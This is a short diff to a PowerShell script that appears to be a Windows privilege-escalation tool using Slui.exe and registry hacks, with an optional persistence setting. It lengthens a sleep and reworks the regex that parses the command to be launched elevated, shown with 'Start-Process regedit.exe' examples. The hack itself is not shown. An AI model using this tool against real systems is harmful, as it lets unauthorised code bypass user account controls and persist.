@@ -151,7 +151,7 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
    ## '$LASTEXITCODE' contains the exit code of the last Win32 executable execution
    If($LASTEXITCODE -eq 0){$ReturnCode = "0-"}Else{$ReturnCode = "1-"}
 
-   Start-Sleep -Milliseconds 3800 # Give time for Slui.exe to finish
+   Start-Sleep -Milliseconds 5800 # Give time for Slui.exe to finish
    ## If '$MakeItPersistence' is set to "True" then the EOP registry hacks will NOT
    # be deleted in the end of cmdlet execution, making the 'command' persistence.
    If($MakeItPersistence -eq "False"){
@@ -201,7 +201,7 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
       #  String: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Start-Process regedit.exe
       $ProcessName = $Command -Split('\s')|Select -Last 1 -EA SilentlyContinue
       $ReturnCode = "$ReturnCode"+"4"
-   }ElseIF($Command -Match '.Env:' -and $Command -Match '\s'){
+   }ElseIF($Command -iMatch '^.Env:' -or $Command -iMatch '^(C:\\)' -and $Command -Match '\s'){
       ## String: $Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe Start-Process regedit.exe
       #  String: $env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe Start-Process regedit.exe
       $ProcessName = $Command -Split('\s')|Select -Last 1 -EA SilentlyContinue
